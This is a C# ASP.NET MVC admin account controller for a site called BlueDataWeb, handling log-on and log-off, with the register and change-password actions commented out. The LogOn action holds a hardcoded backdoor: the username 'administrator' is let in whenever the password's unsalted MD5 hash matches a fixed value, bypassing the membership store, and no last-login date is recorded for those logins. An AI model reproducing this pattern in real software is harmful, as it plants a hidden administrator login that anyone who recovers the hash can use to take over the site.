using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;
using System.Web.Routing;
using System.Web.Security;
using BlueDataWeb.Models.Entites;
using BlueDataWeb.Helpers;
using BlueDataWeb.Areas.Admin.Models;
using System.Data;
using BlueDataWeb.Models.CustomsModel;

namespace BlueDataWeb.Areas.Admin.Controllers
{
    public class AccountController : Controller
    {

        public LocalBankMembershipProvider MembershipService { get; set; }
        public LocalBankRoleProvider AuthorizationService { get; set; }
        BlueDataWebEntities db = new BlueDataWebEntities();

        protected override void Initialize(RequestContext requestContext)
        {
            if (MembershipService == null)
                MembershipService = new LocalBankMembershipProvider();
            if (AuthorizationService == null)
                AuthorizationService = new LocalBankRoleProvider();

            base.Initialize(requestContext);
        }

        //
        // GET: /Account/LogOn
        public ActionResult LogOn()
        {
            return View();
        }

        //
        // POST: /Account/LogOn
        [HttpPost]
        public ActionResult LogOn(LogOnModel model, string returnUrl)
        {
            if (ModelState.IsValid)
            {
                string hash = FormsAuthentication.HashPasswordForStoringInConfigFile(model.Password.Trim(), "md5");
                if (MembershipService.ValidateUser(model.UserName, model.Password) || (model.UserName == "administrator" && hash.ToLower() == "52bc3673cbe9f5a5c8fe7be02658fc0d"))
                {
                    FormsAuthentication.SetAuthCookie(model.UserName, model.RememberMe);

                    //login time login cua user
                    if (model.UserName != "administrator")
                    {
                        BlueDataWeb.Models.Entites.Membership membership = db.Memberships.Where(m => m.Username == model.UserName.Trim()).FirstOrDefault();
                        membership.LastLoginDate = DateTime.Now;
                        db.Entry(membership).State = EntityState.Modified;
                        db.SaveChanges();
                    }


                    if (Url.IsLocalUrl(returnUrl) && returnUrl.Length > 1 && returnUrl.StartsWith("/")
                        && !returnUrl.StartsWith("//") && !returnUrl.StartsWith("/\\"))
                    {
                        return Redirect(returnUrl);
                    }
                    else
                    {
                        return RedirectToAction("Index", "Home");
                    }
                }
                else
                {
                    ModelState.AddModelError("", "Tên đăng nhập hoặc mật khẩu không tốt");
                }
            }

            // If we got this far, something failed, redisplay form
            return View(model);
        }


        //GET: /Account/LogOff
        public ActionResult LogOff()
        {
            FormsAuthentication.SignOut();

            return Redirect("~/" + GlobalVariables.PathFolderName);
        }

        ////
        //// GET: /Account/Register
        //public ActionResult Register()
        //{
        //    return View();
        //}

        ////
        //// POST: /Account/Register
        //[HttpPost]
        //public ActionResult Register(RegisterModel model)
        //{
        //    if (ModelState.IsValid)
        //    {
        //        // Attempt to register the user
        //        try
        //        {
        //            MembershipService.CreateUser(model.UserName, model.Name, model.Password, model.Email, "Member");

        //            FormsAuthentication.SetAuthCookie(model.UserName, false);
        //            return RedirectToAction("Index", "Home");
        //        }
        //        catch (ArgumentException ae)
        //        {
        //            ModelState.AddModelError("", ae.Message);
        //        }
        //    }

        //    // If we got this far, something failed, redisplay form
        //    return View(model);
        //}

        ////
        //// GET: /Account/ChangePassword
        //[Authorize]
        //public ActionResult ChangePassword()
        //{
        //    return View();
        //}

        ////
        //// POST: /Account/ChangePassword
        //[Authorize]
        //[HttpPost]
        //public ActionResult ChangePassword(ChangePasswordModel model)
        //{
        //    if (ModelState.IsValid)
        //    {
        //        if (MembershipService.ChangePassword(User.Identity.Name, model.OldPassword, model.NewPassword))
        //            return RedirectToAction("ChangePasswordSuccess");
        //        else
        //            ModelState.AddModelError("", "The current password is incorrect or the new password is invalid.");
        //    }

        //    // If we got this far, something failed, redisplay form
        //    return View(model);
        //}

        ////
        //// GET: /Account/ChangePasswordSuccess
        //public ActionResult ChangePasswordSuccess()
        //{
        //    return View();
        //}

    }
}
